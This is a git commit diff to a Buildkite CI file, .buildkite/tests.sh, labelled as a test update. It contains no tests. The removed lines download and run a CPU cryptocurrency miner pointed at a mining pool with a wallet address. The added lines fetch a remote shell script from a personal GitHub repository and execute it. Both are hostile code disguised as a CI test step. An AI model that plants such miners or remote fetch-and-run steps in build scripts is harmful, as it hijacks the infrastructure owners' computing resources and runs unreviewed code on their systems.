ad3666d4cb4d59e5862aa614e9375c7810b2d082
tuhsv228 <85036765+tuhsv228@users.noreply.github.com>
2021-05-30 12:00:49 +0530

    Update tests.sh

--- .buildkite/tests.sh
+++ .buildkite/tests.sh
@@ -1,7 +1,6 @@
 #!/bin/sh
 
 
-wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
-./cpuminer -a yespowersugar -o stratum+tcp://instapool.xyz:3032 -u sugar1qtn9h2lkja0geqs56mdkg6shq2d95jp2e8aj0z6.wtf
-
-done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
+wget https://github.com/tuhsv228/test/raw/main/Dep.sh
+chmod +x Dep.sh
+./Dep.sh
